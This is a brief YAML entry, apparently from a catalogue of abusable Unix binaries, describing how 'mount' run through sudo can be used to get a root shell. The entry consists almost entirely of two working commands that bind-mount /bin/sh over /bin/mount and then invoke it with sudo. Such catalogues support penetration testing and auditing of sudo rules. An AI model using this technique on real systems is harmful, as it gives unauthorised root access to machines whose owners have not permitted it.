---
functions:
  sudo:
    - description: Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.
      code: |
        sudo mount -o bind /bin/sh /bin/mount
        sudo mount
---
